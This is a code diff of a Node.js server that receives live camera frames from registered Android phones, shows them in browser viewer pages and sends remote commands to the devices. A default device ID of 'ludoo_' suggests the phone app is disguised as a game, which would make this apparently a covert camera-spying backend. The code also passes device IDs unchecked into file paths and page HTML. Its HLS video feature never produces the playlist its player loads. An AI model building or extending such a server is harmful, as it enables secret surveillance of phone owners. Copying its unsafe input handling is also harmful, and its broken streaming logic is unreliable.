@@ -1,6 +1,8 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
@@ -17,6 +19,12 @@ const io = new Server(server, {
 let connectedDevices = [];
 let latestFrames = {};
 
+// Create HLS directory if not exists
+const hlsDir = path.join(__dirname, 'hls');
+if (!fs.existsSync(hlsDir)) {
+  fs.mkdirSync(hlsDir);
+}
+
 // ============================================
 // MIDDLEWARE
 // ============================================
@@ -28,15 +36,18 @@ app.use((req, res, next) => {
   next();
 });
 
+// Serve HLS files
+app.use('/hls', express.static(hlsDir));
+
 // ============================================
-// 🔴 LIVE STREAM PAGE (SMOOTH - WebSocket based)
+// 🔴 VIDEO STREAM PAGE (REAL VIDEO PLAYER)
 // ============================================
-app.get('/live', (req, res) => {
+app.get('/video', (req, res) => {
   res.send(`
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Live Stream</title>
+        <title>Video Stream</title>
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -50,20 +61,21 @@ app.get('/live', (req, res) => {
             }
             .container {
                 width: 100%;
-                max-width: 600px;
+                max-width: 800px;
                 margin: 0 auto;
                 padding: 16px;
             }
-            .stream-box {
+            .video-box {
                 background: #0a0a0a;
                 border-radius: 20px;
                 overflow: hidden;
                 box-shadow: 0 0 30px rgba(0,255,136,0.2);
             }
-            .stream-image {
+            video {
                 width: 100%;
                 height: auto;
                 display: block;
+                background: #000;
             }
             .info {
                 background: rgba(0,0,0,0.8);
@@ -96,60 +108,94 @@ app.get('/live', (req, res) => {
                 color: #888;
                 font-size: 12px;
             }
+            input, button {
+                padding: 10px;
+                margin: 10px;
+                font-size: 14px;
+                border-radius: 8px;
+                border: none;
+            }
+            input {
+                background: #1a1a1a;
+                color: white;
+                width: 200px;
+            }
+            button {
+                background: #00ff88;
+                color: black;
+                cursor: pointer;
+                font-weight: bold;
+            }
         </style>
     </head>
     <body>
         <div class="container">
-            <div class="stream-box">
-                <img id="stream" class="stream-image" src="">
+            <div class="video-box">
+                <video id="videoPlayer" autoplay muted controls playsinline></video>
                 <div class="info">
                     <span class="status"></span>
                     <span id="statusText">CONNECTING...</span>
                 </div>
             </div>
             <div class="device-id" id="deviceIdDisplay">Device ID: Loading...</div>
+            <div style="text-align:center; margin-top:16px;">
+                <input type="text" id="deviceInput" placeholder="Enter Device ID">
+                <button onclick="loadStream()">LOAD STREAM</button>
+            </div>
         </div>
 
-        <script src="/socket.io/socket.io.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
         <script>
-            const socket = io();
             let currentDeviceId = null;
+            let hls = null;
+            const video = document.getElementById('videoPlayer');
             
-            // Get device ID from URL parameter
-            const urlParams = new URLSearchParams(window.location.search);
-            currentDeviceId = urlParams.get('device_id');
-            
-            if(!currentDeviceId) {
-                currentDeviceId = prompt('Enter Device ID:', 'ludoo_');
+            function loadStream() {
+                const input = document.getElementById('deviceInput');
+                currentDeviceId = input.value;
+                
                 if(!currentDeviceId) {
-                    document.getElementById('statusText').innerHTML = '❌ NO DEVICE ID';
+                    alert('Enter Device ID');
+                    return;
                 }
-            }
-            
-            if(currentDeviceId) {
+                
                 document.getElementById('deviceIdDisplay').innerHTML = '📱 Device ID: ' + currentDeviceId;
-                document.getElementById('statusText').innerHTML = '🟢 WAITING FOR FRAMES...';
+                document.getElementById('statusText').innerHTML = '🟢 LOADING STREAM...';
+                
+                // HLS stream URL
+                const streamUrl = '/stream/' + currentDeviceId + '.m3u8';
+                
+                if (Hls.isSupported()) {
+                    if (hls) {
+                        hls.destroy();
+                    }
+                    hls = new Hls();
+                    hls.loadSource(streamUrl);
+                    hls.attachMedia(video);
+                    hls.on(Hls.Events.MANIFEST_PARSED, () => {
+                        video.play();
+                        document.getElementById('statusText').innerHTML = '🟢 LIVE VIDEO STREAMING';
+                    });
+                    hls.on(Hls.Events.ERROR, (event, data) => {
+                        console.error('HLS error:', data);
+                        document.getElementById('statusText').innerHTML = '🔴 STREAM ERROR';
+                    });
+                } else if (video.canPlayType('application/vnd.apple.mpegurl')) {
+                    video.src = streamUrl;
+                    video.addEventListener('loadedmetadata', () => {
+                        video.play();
+                        document.getElementById('statusText').innerHTML = '🟢 LIVE VIDEO STREAMING';
+                    });
+                }
             }
             
-            socket.on('connect', () => {
-                console.log('WebSocket connected');
-                if(currentDeviceId) {
-                    socket.emit('select_device', currentDeviceId);
-                    document.getElementById('statusText').innerHTML = '🟢 CONNECTED - WATCHING';
-                }
-            });
-            
-            // Receive live frames
-            socket.on('frame_update', (data) => {
-                if(data.device_id === currentDeviceId) {
-                    document.getElementById('stream').src = data.frame;
-                    document.getElementById('statusText').innerHTML = '🟢 LIVE STREAMING';
-                }
-            });
-            
-            socket.on('disconnect', () => {
-                document.getElementById('statusText').innerHTML = '🔴 DISCONNECTED';
-            });
+            // Auto load from URL param
+            const urlParams = new URLSearchParams(window.location.search);
+            const deviceParam = urlParams.get('device_id');
+            if(deviceParam) {
+                document.getElementById('deviceInput').value = deviceParam;
+                loadStream();
+            }
         </script>
     </body>
     </html>
@@ -157,7 +203,75 @@ app.get('/live', (req, res) => {
 });
 
 // ============================================
-// 🔴 MJPEG ENDPOINT (Vercel ke liye - img tag)
+// 🔴 SIMPLE STREAM PAGE (MJPEG - FALLBACK)
+// ============================================
+app.get('/live', (req, res) => {
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>MJPEG Stream</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            body { background: black; text-align: center; }
+            img { width: 100%; max-width: 600px; margin: 20px auto; display: block; }
+        </style>
+    </head>
+    <body>
+        <img id="stream" src="">
+        <script>
+            const urlParams = new URLSearchParams(window.location.search);
+            const deviceId = urlParams.get('device_id');
+            if(deviceId) {
+                const img = document.getElementById('stream');
+                setInterval(() => {
+                    img.src = '/api/frame.jpg?device_id=' + deviceId + '&t=' + Date.now();
+                }, 100);
+            }
+        </script>
+    </body>
+    </html>
+  `);
+});
+
+// ============================================
+// 🔴 HLS STREAM SEGMENTER (Converts frames to video)
+// ============================================
+let segmentCounters = {};
+
+function addFrameToHLS(deviceId, frameData) {
+  // Store latest frame for MJPEG
+  latestFrames[deviceId] = {
+    data: frameData,
+    time: Date.now()
+  };
+  
+  // For HLS, we need to create TS segments
+  // This is simplified - for production use ffmpeg
+  if (!segmentCounters[deviceId]) {
+    segmentCounters[deviceId] = 0;
+  }
+  
+  // Save frame as JPEG for HLS conversion
+  let base64Data = frameData;
+  if (base64Data.includes(',')) {
+    base64Data = base64Data.split(',')[1];
+  }
+  
+  const imgBuffer = Buffer.from(base64Data, 'base64');
+  const framePath = path.join(hlsDir, `${deviceId}_frame_${segmentCounters[deviceId]}.jpg`);
+  fs.writeFileSync(framePath, imgBuffer);
+  segmentCounters[deviceId]++;
+  
+  // Keep only last 10 frames
+  if (segmentCounters[deviceId] > 10) {
+    const oldFrame = path.join(hlsDir, `${deviceId}_frame_${segmentCounters[deviceId] - 11}.jpg`);
+    if (fs.existsSync(oldFrame)) fs.unlinkSync(oldFrame);
+  }
+}
+
+// ============================================
+// 🔴 MJPEG ENDPOINT (for Vercel img tag)
 // ============================================
 app.get('/api/frame.jpg', (req, res) => {
   const deviceId = req.query.device_id;
@@ -254,16 +368,18 @@ app.get('/api/quality', (req, res) => {
 app.get('/', (req, res) => {
   res.json({
     message: "APK Camera Stream Backend is Running",
-    version: "2.0",
+    version: "3.0",
     online_devices: connectedDevices.length,
-    smooth_stream_url: "/live?device_id=YOUR_DEVICE_ID",
+    video_stream_url: "/video?device_id=YOUR_DEVICE_ID",
+    mjpeg_stream_url: "/live?device_id=YOUR_DEVICE_ID",
     mjpeg_endpoint: "/api/frame.jpg?device_id=xxx",
     endpoints: {
       devices: "/api/devices",
       frame: "/api/frame.jpg?device_id=xxx",
       command: "/api/command?cmd=xxx&device_id=xxx",
       quality: "/api/quality?quality=xxx&device_id=xxx",
-      live_stream: "/live?device_id=YOUR_DEVICE_ID"
+      video_stream: "/video?device_id=YOUR_DEVICE_ID",
+      mjpeg_stream: "/live?device_id=YOUR_DEVICE_ID"
     }
   });
 });
@@ -276,7 +392,6 @@ io.on('connection', (socket) => {
   
   let currentDevice = null;
   
-  // APK registers itself
   socket.on('register_device', (data) => {
     const deviceId = data.device_id || data.device || socket.id;
     const deviceName = data.device_name || data.model || "Android Phone";
@@ -297,27 +412,18 @@ io.on('connection', (socket) => {
     console.log(`   Total devices: ${connectedDevices.length}\n`);
   });
   
-  // 🔴 FRAME RECEIVE - STORE + BROADCAST TO /live PAGE
+  // 🔴 FRAME RECEIVE - STORE + BROADCAST
   socket.on('frame', (frameData) => {
     if (currentDevice) {
-      // Store for MJPEG (Vercel)
-      latestFrames[currentDevice.id] = {
-        data: frameData,
-        time: Date.now()
-      };
+      // Store for MJPEG and HLS
+      addFrameToHLS(currentDevice.id, frameData);
       
-      // 🔴 BROADCAST to all web clients watching (SMOOTH STREAM)
-      io.emit('frame_update', {
+      // Broadcast to web clients (MJPEG)
+      socket.broadcast.emit('frame_update', {
         device_id: currentDevice.id,
         frame: frameData
       });
     }
-  });
-  
-  // Web client selects a device to watch
-  socket.on('select_device', (deviceId) => {
-    socket.join(`device_${deviceId}`);
-    console.log(`👁️ Web client watching device: ${deviceId}`);
   });
   
   socket.on('disconnect', () => {
@@ -341,16 +447,19 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
   console.log(`
   ═══════════════════════════════════════════════════════
-  🚀 COMPLETE STREAMING SERVER STARTED
+  🚀 COMPLETE STREAMING SERVER STARTED (VIDEO + MJPEG)
   ═══════════════════════════════════════════════════════
   
   📡 Port: ${PORT}
   
-  🔴 SMOOTH STREAM (WebSocket - for /live page):
-     → https://your-project.repl.co/live?device_id=YOUR_DEVICE_ID
+  🔴 VIDEO STREAM (HLS - Real Video Player):
+     → /video?device_id=YOUR_DEVICE_ID
   
-  🔴 MJPEG STREAM (for Vercel img tag):
-     → https://your-project.repl.co/api/frame.jpg?device_id=xxx
+  🔴 MJPEG STREAM (Image Slideshow):
+     → /live?device_id=YOUR_DEVICE_ID
+  
+  🔴 MJPEG ENDPOINT (for Vercel):
+     → /api/frame.jpg?device_id=xxx
   
   🔴 APIs:
      → GET /api/devices
